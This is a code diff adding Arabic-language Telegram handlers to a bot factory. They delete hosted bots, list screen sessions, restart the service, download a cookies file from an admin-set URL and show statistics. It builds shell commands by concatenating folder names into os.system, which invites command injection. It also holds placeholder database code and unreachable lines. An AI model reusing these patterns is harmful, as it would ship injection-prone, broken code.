+@Client.on_callback_query(filters.regex("confirm_delete"))
+async def confirm_delete(client, callback_query):
+    bot_found = False
+
+    for bot in Bots[:]: 
+        Bots.remove(bot)
+        xx = {"username": bot}
+        db.delete_one(xx)
+        bot_found = True
+
+        for folder in os.listdir("Maked"):
+            if re.search('[Bb][Oo][Tt]', folder):
+                shutil.rmtree(f"Maked/{folder}", ignore_errors=True)
+                os.system(f"screen -XS {folder} quit")
+                os.system('cd Maked/' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit')
+
+    if bot_found:
+        await callback_query.message.edit_text("تم حذف جميع البوتات بنجاح ✅")
+    else:
+        await callback_query.message.edit_text("لم يتم العثور على بوتات لحذفها")
+
+@Client.on_callback_query(filters.regex("cancel_delete"))
+async def cancel_delete(client, callback_query):
+    await callback_query.message.edit_text("تم إلغاء عملية الحذف ❌")
+
+
+@Client.on_message(filters.command(["الاسكرينات المفتوحه"], ""))
+async def kinhsker(client: Client, message):
+ if message.from_user.id in [7623838169, 8122544723, 8176410693]:
+    n = 0
+    response_message = "<b>──「  الاسكرينات المفتوحه من الشيخ」──</b>\n\n"
+    for screen in os.listdir("/var/run/screen/S-root"):
+        n += 1
+        response_message += f"{n} - ( `{screen}` )\n"
+    await message.reply_text(response_message) 
+
+@Client.on_message(filters.command("تحديث الصانع", ""))
+async def update_factory(client: Client, message):
+    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
+        try:
+            confirm_msg = await message.reply(
+                "هل انت متاكد من تحديث الشيخ",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("تحديث", callback_data="confirm_update")],
+                    [InlineKeyboardButton("إلغاء", callback_data="cancel_update")]
+                ])
+            )
+        except Exception as e:
+            await message.reply_text(f"فشل إرسال رسالة التأكيد: {e}")
+    else:
+        await message.reply_text("هذا الأمر يخص الشيخ")
+
+@Client.on_callback_query(filters.regex("^confirm_update$"))
+async def confirm_update(client, callback_query):
+    try:
+        msg = await callback_query.message.edit_text("جاري تحديث المصنع...")
+        await asyncio.sleep(2)
+        await msg.delete()
+        for bot in Bots[:]:
+            Bots.remove(bot)
+            username = bot[0]
+            xx = {"username": username}
+            db.delete_one(xx)            
+            for folder in os.listdir("Maked"):
+                if re.search('[Bb][Oo][Tt]', folder):
+                    try:
+                        shutil.rmtree(f"Maked/{folder}", ignore_errors=True)
+                        os.system(f"screen -XS {folder} quit")
+                        os.system(f'cd Maked/{folder} && chmod +x * && screen -X -S {folder.replace("@", "")} quit')
+                    except Exception as e:
+                        print(f"Error cleaning bot {folder}: {e}")        
+        db.update_one({"some_field": "some_value"}, {"$set": {"new_field": "new_value"}})
+        args = [sys.executable, "main.py"]
+        environ = os.environ.copy()
+        os.execle(sys.executable, *args, environ)
+        await callback_query.message.reply_text("تم تحديث الصانع بنجاح")
+    except Exception as e:
+        await callback_query.message.reply_text(f"فشل تحديث المصنع: {e}")
+
+@Client.on_callback_query(filters.regex("^cancel_update$"))
+async def cancel_update(client, callback_query):
+    await callback_query.message.edit_text("تم الغاء التحديث بنجاح")
+
+
+# ============ دوال كوكيز و اليوتيوب ============
+
+youtubee = ""
+
+@Client.on_message(filters.command("تعين كوكيز", ""))
+async def set_youtube(client: Client, message: Message):
+    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
+        try:
+            youtube_msg = await client.ask(
+                chat_id=message.chat.id, 
+                text="أرسل رابط ملفات تعريف الارتباط : كوكيز", 
+                timeout=30
+            )
+            global youtubee
+            youtubee = youtube_msg.text
+            await message.reply_text("تم تعين ملفات تعريف الارتباط بنجاح")
+        except TimeoutError:
+            await message.reply_text("⏰ انتهى الوقت المحدد لإرسال الرابط.")
+        except Exception as e:
+            await message.reply_text(f"⚠️ حدث خطأ أثناء تعيين ملفات: {e}")
+    else:
+        await message.reply_text("هذا الأمر يخص الشيخ")
+        
+@Client.on_message(filters.command("إعادة تهيئة", ""))
+async def restart_youtube(client: Client, message: Message):
+    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
+        try:
+            save_file()
+            await message.reply_text("✔️ تم تحديث ملفات بنجاح.")
+        except Exception as e:
+            await message.reply_text(f"⚠️ حدث خطأ أثناء تحديث: {e}")
+    else:
+        await message.reply_text("هذا الأمر يخص الشيخ")
+        
+def save_file():
+    global youtubee
+    try:
+        headers = {
+            'Accept': 'text/plain',
+            'User-Agent': 'python-requests'
+        }
+        file_path="/root/cookies/cookies.txt"
+        if os.path.exists(file_path):
+            os.remove(file_path)
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
+        response = requests.get(f'{youtubee}', headers=headers)
+        with open(file_path, 'w', encoding='utf-8') as file:
+            file.write(response.text)
+    except Exception as error:
+        print('Error:', str(error))
+
+        
+
+# ============ دوال معلومات و إحصائيات الصانع ============
+        
+@Client.on_message(filters.command("معلومات الصانع", ""))
+async def Sudo_Start(client: Client, message):
+    if message.from_user.id not in SUDORS:
+        return await message.reply_text("هذا الأمر يخص الشيخ")    
+    try:
+        global OFF
+        bot_user = await client.get_me()
+        OFF = "معطل >> ❎" if globals().get('OFF', False) else "مفعل >> ✅"        
+        total_users, total_SUDORS, total_blocked, total_bots = await asyncio.gather(
+            asyncio.to_thread(len, get_users()),
+            asyncio.to_thread(len, SUDORS),
+            asyncio.to_thread(len, blocked),
+            asyncio.to_thread(len, Bots)
+        )        
+        photo = None
+        if bot_user.photo:
+            photo = await client.download_media(bot_user.photo.big_file_id)        
+        caption = f"""
+<b>{bot_user.first_name}</b>
+<blockquote>
+<u>معلومات صانع الشيخ</u>
+وضع الصانع : [ {OFF} ]
+
+╮❖ عدد المستخدمين : {total_users}
+ │❖ عدد المطورين : {total_SUDORS}
+ |❖ عدد المحظورين : {total_blocked}
+╯❖ عدد البوتات : {total_bots}
+</blockquote>
+"""
+        reply_markup = InlineKeyboardMarkup([
+            [InlineKeyboardButton("ꜱʜᴇɪᴋʜ", url="https://t.me/kafra_wi_1")]
+        ])
+        if photo:
+            await message.reply_photo(
+                photo=photo,
+                caption=caption,
+                reply_markup=reply_markup
+            )
+            if os.path.exists(photo):
+                os.remove(photo)
+        else:
+            await message.reply_text(
+                text=caption,
+                reply_markup=reply_markup
+            )            
+    except Exception as e:
+        await message.reply(f"⚠️ حدث خطأ: {str(e)}")
